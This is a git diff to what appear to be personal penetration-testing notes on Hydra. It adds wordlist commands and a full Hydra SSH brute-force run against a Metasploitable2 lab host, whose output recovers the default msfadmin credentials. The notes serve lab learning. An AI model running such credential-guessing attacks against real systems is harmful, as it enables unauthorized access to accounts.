@@ -12,7 +12,9 @@
      - [Common Mistakes; variables argument needed for http-post-form](#common-mistakes-variables-argument-needed-for-http-post-form)
 - [SSH](#ssh)
      - [hydra -L users.txt -P passwords.txt ssh://$t](#hydra--l-userstxt--p-passwordstxt-ssht)
-          - [Metasploitable2](#metasploitable2-kex-error--no-match-for-method-server-host-key-algo)
+          - [Common Problem in Metasploitable2](#metasploitable2-kex-error--no-match-for-method-server-host-key-algo)
+          - [Solution: kali-tweaks](#solution-kali-tweaks)
+          - [Try Again](#try-again)
 
 
 # [Basic](#basic-1)
@@ -192,8 +194,9 @@ Syntax: <url>:<form parameters>[:<optional>[:<optional>]:<condition string>
 ## hydra -L users.txt -P passwords.txt ssh://$t
 ### Metasploitable2: kex error : no match for method server host key algo
 ```sh
-head /usr/share/seclists/Usernames/top-usernames-shortlist.txt > users.txt
+head -2 /usr/share/seclists/Usernames/top-usernames-shortlist.txt > users.txt
 echo msfadmin >> users.txt
+head -2 /usr/share/seclists/Passwords/500-worst-passwords.txt | tee passwords.txt
 echo msfadmin | tee -a passwords.txt
 
 $ hydra -L users.txt -P passwords.txt ssh://$t
@@ -223,9 +226,27 @@ $ kali-tweaks
 > Press Enter to continue...
 ```
 
-### 
+#### Try Again
 ```sh
+$ hydra -VL users.txt -P passwords.txt ssh://$t
+Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-10-01 09:39:31
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 9 tasks per 1 server, overall 9 tasks, 9 login tries (l:3/p:3), ~1 try per task
+[DATA] attacking ssh://10.1.1.1:22/
+[ATTEMPT] target 10.1.1.1 - login "root" - pass "123456" - 1 of 9 [child 0] (0/0)
+[ATTEMPT] target 10.1.1.1 - login "root" - pass "password" - 2 of 9 [child 1] (0/0)
+[ATTEMPT] target 10.1.1.1 - login "root" - pass "msfadmin" - 3 of 9 [child 2] (0/0)
+[ATTEMPT] target 10.1.1.1 - login "admin" - pass "123456" - 4 of 9 [child 3] (0/0)
+[ATTEMPT] target 10.1.1.1 - login "admin" - pass "password" - 5 of 9 [child 4] (0/0)
+[ATTEMPT] target 10.1.1.1 - login "admin" - pass "msfadmin" - 6 of 9 [child 5] (0/0)
+[ATTEMPT] target 10.1.1.1 - login "msfadmin" - pass "123456" - 7 of 9 [child 6] (0/0)
+[ATTEMPT] target 10.1.1.1 - login "msfadmin" - pass "password" - 8 of 9 [child 7] (0/0)
+[ATTEMPT] target 10.1.1.1 - login "msfadmin" - pass "msfadmin" - 9 of 9 [child 8] (0/0)
+[22][ssh] host: 10.1.1.1   login: msfadmin   password: msfadmin
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-10-01 09:39:35
 ```
 
 ### 
